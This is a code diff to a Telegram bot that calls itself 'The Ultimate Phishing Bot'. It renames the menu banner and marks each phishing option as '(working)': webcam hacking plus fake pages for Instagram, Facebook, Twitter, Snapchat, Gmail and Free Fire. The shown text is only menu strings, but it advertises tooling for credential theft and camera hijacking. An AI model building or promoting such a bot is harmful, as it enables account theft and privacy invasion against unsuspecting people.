@@ -181,7 +181,7 @@ def show_main_menu(message):
     user_id = message.chat.id
     bot.send_message(
         user_id,
-        "🔥 *NR HACKZ* 🔥\n"
+        "🔥 *DEMON SOKY LITE* 🔥\n"
         "╔═══════════════════════════════╗\n"
         "║  ⚡ The Ultimate Phishing Bot ⚡  ║\n"
         "╚═══════════════════════════════╝\n\n"
@@ -190,15 +190,15 @@ def show_main_menu(message):
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         "📌 *Choose your weapon:*\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "📸 Cam Hack \n"
-        "📸 Instagram \n"
-        "📘 Facebook \n"
-        "🐦 Twitter \n"
-        "👻 Snapchat \n"
-        "📧 Gmail \n"
-        "🎮 Free Fire \n"
-        "🎬 GoLiveGram \n"
-        "🔗 All Links \n\n"
+        "📸 Cam Hack (working)\n"
+        "📸 Instagram (working)\n"
+        "📘 Facebook (working)\n"
+        "🐦 Twitter (working)\n"
+        "👻 Snapchat (working)\n"
+        "📧 Gmail (working)\n"
+        "🎮 Free Fire (working)\n"
+        "🎬 GoLiveGram (working)\n"
+        "🔗 All Links (working)\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         "💬 *Use buttons below or type commands.*\n"
         "⚠️ *Stay anonymous. Stay safe.*",
